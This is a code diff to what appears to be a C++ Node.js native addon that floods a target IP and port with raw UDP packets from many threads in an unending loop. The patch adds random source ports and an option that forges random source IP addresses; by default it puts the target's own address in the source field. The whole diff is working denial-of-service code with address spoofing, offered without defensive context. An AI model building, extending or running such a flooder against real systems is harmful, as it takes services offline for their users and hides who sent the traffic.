@@ -115,6 +115,11 @@ char *generate_ipv4()
     return ipv4_str;
 }
 
+/* Generate random port*/
+int generate_port() {
+    return ((rand() % (65535-10240+1)) + 10240);
+}
+
 /* Generate random hex array*/
 u_char *generate_hex_array(int length)
 {
@@ -178,9 +183,10 @@ u_short udp_checksum(unsigned short *ptr, int nbytes)
 }
 
 /* Fill in IP header, UDP header, Pseudo UDP header */
-void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo, char *buf, int packetsize)
+void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo, char *buf, int packetsize, int fakeIp, struct in_addr sin_addr)
 {
-    char *src_ip = generate_ipv4();
+    char *src_ip = inet_ntoa(*(struct in_addr *)&sin_addr);
+    if(fakeIp == 1) src_ip = generate_ipv4();
 
     // IP header
     ip->ver_ihl = (4 << 4) | (sizeof(Ip) / sizeof(unsigned int));
@@ -196,7 +202,7 @@ void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo, char *bu
     ip->checksum = ip_checksum((u_short *)buf, ip->total_len);
 
     // UDP header
-    udp->sport = htons(1024);
+    udp->sport = htons(generate_port());
     udp->dport = htons(dst_port);
     udp->len = htons(sizeof(struct Udp) + packetsize);
     udp->checksum = 0;
@@ -209,7 +215,7 @@ void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo, char *bu
     pseudo->length = htons(sizeof(struct Udp) + packetsize);
 }
 
-void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsize = 10)
+void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsize = 10, int fakeIp = 0)
 {
     struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 
@@ -229,7 +235,7 @@ void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsi
     while (true)
     {
         strcpy(data, (const char *)generate_hex_array(packetsize));
-        init_header(ip, udp, &pseudo, buf, packetsize);
+        init_header(ip, udp, &pseudo, buf, packetsize, fakeIp, addr->sin_addr);
 
         int psize = sizeof(struct Pseudo) + sizeof(struct Udp) + packetsize;
         pseudogram = (char *)malloc(psize);
@@ -278,6 +284,7 @@ void Method(const FunctionCallbackInfo<Value> &args)
     int delay = args[3]->Int32Value(isolate->GetCurrentContext()).ToChecked();
     int packetsize = args[4]->Int32Value(isolate->GetCurrentContext()).ToChecked();
     int numThreads = args[5]->Int32Value(isolate->GetCurrentContext()).ToChecked();
+    int fakeIp = args[6]->Int32Value(isolate->GetCurrentContext()).ToChecked();
 
     // Get the destination IP address and port number from the arguments
     String::Utf8Value str_ip(isolate, args[0]);
@@ -312,7 +319,7 @@ void Method(const FunctionCallbackInfo<Value> &args)
     std::thread threads[numThreads];
     for (int i = 0; i < numThreads; i++)
     {
-        threads[i] = std::thread(send_UDP, &addr, timeout, delay, packetsize);
+        threads[i] = std::thread(send_UDP, &addr, timeout, delay, packetsize, fakeIp);
 
         if (threads[i].get_id() == std::thread::id())
         {
